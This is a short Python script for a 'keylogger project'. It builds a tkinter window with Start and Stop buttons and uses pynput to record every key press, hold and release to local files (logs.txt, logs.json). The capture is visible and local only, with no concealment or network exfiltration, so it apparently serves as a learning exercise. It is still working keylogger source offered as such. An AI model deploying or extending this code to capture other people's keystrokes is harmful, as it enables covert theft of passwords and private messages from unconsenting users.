import keyword
import tkinter as tk #tkinter is used to bulid GUI (graphical user interface) application in python.
from tkinter import *
from pynput import keyboard # used to capture keyboard input
import json #json is used to convert the python dictionary above into a JSON string that can be written into a file.

root = tk.Tk()
root.geometry("350x400")
root .title("keylogger project")

key_list = []
x= False
key_strokes=""

def update_txt_file (key):
     with open('logs.txt', 'w+') as key_stroke:
                key_stroke.write(key)

def update_json_file(key_list): 
    with open ('logs.json', 'wb') as key_log:
                key_list_bytes = json.dumps (key_list).encode()
                key_log.write(key_list_bytes)

def on_press (key):
    global x, key_list 
    if x == False:
           key_list.append(
                   {'Pressed': f'{key}'}
            )
    x = True
    if x == True: 
        key_list.append(
        {'Held': f'{key}'})

    update_json_file(key_list)
    
def on_release (key): 
    global x, key_list, key_strokes 
    key_list.append(
        {'Released': f'{key}'}
    )
    if  x ==  True:
          x = False 
    update_json_file (key_list)
    key_strokes= key_strokes + str(key) 
    update_txt_file (str (key_strokes))

def button_action():
     print("[+] running keylogger successfully!\n[!] saving the key log in 'logs.json' " )

     with keyboard.Listener(
          on_press=on_press,
          on_release=on_release) as listener:
          listener.join()
          
def close():
      root.destroy()

root.configure(background="Grey")
empty = Label(root , text="keylogger" , font='verdana 11 bold').grid(row=2 ,column=2)

Button(root, text="Start keylogger",width=25,command=button_action).grid(row=5, column=3)
Button(root, text="Stop keylogger" ,width=25, command=close).grid(row=6,column=3)
root.mainloop()

